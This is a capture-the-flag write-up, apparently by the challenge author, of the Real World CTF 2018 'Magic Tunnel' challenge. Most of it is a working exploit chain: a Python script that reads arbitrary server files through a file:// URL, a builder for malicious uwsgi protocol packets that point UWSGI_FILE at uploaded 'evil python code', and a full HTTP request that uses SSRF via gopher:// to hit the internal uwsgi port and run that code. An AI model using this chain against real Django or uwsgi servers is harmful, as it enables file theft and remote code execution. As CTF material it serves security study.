# Real World CTF 2018 Quals - Magic Tunnel

This is my second challenge for the Real World CTF 2018.

Read arbitrary files:

```python
import re
import requests


s = requests.session()

response = s.post('http://117.51.155.71:8080/', data={
    'url': 'file:///usr/src/rwctf/manage.py',
    'csrfmiddlewaretoken': 'HrBo1jyAca5ICUYez55WYYB11f34QeBRwOi4mQb2MHBLtqHFfyjSXgE3qzLnxkLR'
}, cookies={'csrftoken': 'HrBo1jyAca5ICUYez55WYYB11f34QeBRwOi4mQb2MHBLtqHFfyjSXgE3qzLnxkLR'}, allow_redirects=True)

# print(response.text)


g = re.search('<img src="(.+?)"', response.text)
filename = g.group(1)
print(filename)

response = s.get('http://117.51.155.71:8080' + filename)
print(response.text)

```

Download and read the source code.

Generate evil uwsgi protocol bytes, `/usr/src/rwctf/media/2018/11/29/b1a1121e-5c8f-4b13-99df-80f76f73560c` is the evil python code that you have downloaded.

```python
import sys
import struct
import socket
import argparse
import io
from urllib.parse import quote
from typing import AnyStr, Dict


def sz(x: AnyStr):
    assert isinstance(x, (str, bytes))
    return struct.pack('h', len(x))


def pack_uwsgi_vars(vars: Dict):
    pk = b''
    for k, v in vars.items():
        pk += sz(k) + k.encode() + sz(v) + v.encode()
    return b'\x00' + sz(pk) + b'\x00' + pk


def send_package(vars, body=b''):
    s = socket.create_connection(('127.0.0.1', 8000))

    s.send(pack_uwsgi_vars(vars) + body)
    response = []
    while 1:
        data = s.recv(4096)
        if not data:
            break
        response.append(data)
    s.close()
    return b''.join(response)


def generate_package(vars, body=b''):
    return pack_uwsgi_vars(vars) + body


def main():
    vars = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': '/',
        'REQUEST_URI': '/',
        'QUERY_STRING': '',
        'SERVER_NAME': 'localhost',
        'HTTP_HOST': 'localhost:8000',
        'UWSGI_FILE': '/usr/src/rwctf/media/2018/11/29/b1a1121e-5c8f-4b13-99df-80f76f73560c',
        'UWSGI_APPID': 'app'
    }
    res = generate_package(vars)
    print(quote(res))


main()
```

Use SSRF to send evil bytes to uwsgi port 8000:

```
POST / HTTP/1.1
Host: localhost:8000
Connection: keep-alive
Content-Length: 595
Cache-Control: max-age=0
Origin: http://localhost:8000
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=--------201831808
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: csrftoken=HrBo1jyAca5ICUYez55WYYB11f34QeBRwOi4mQb2MHBLtqHFfyjSXgE3qzLnxkLR; sessionid=f1j1izll6b7xlgcg91v5xpnbzgm0438t

----------201831808
Content-Disposition: form-data; name="url"

gopher://127.0.0.1:8000/_%00%F5%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%09%00localhost%09%00HTTP_HOST%0E%00localhost%3A8000%0A%00UWSGI_FILED%00/usr/src/rwctf/media/2018/11/29/b1a1121e-5c8f-4b13-99df-80f76f73560c%0B%00UWSGI_APPID%03%00app
----------201831808
Content-Disposition: form-data; name="csrfmiddlewaretoken"

HrBo1jyAca5ICUYez55WYYB11f34QeBRwOi4mQb2MHBLtqHFfyjSXgE3qzLnxkLR
----------201831808--

```
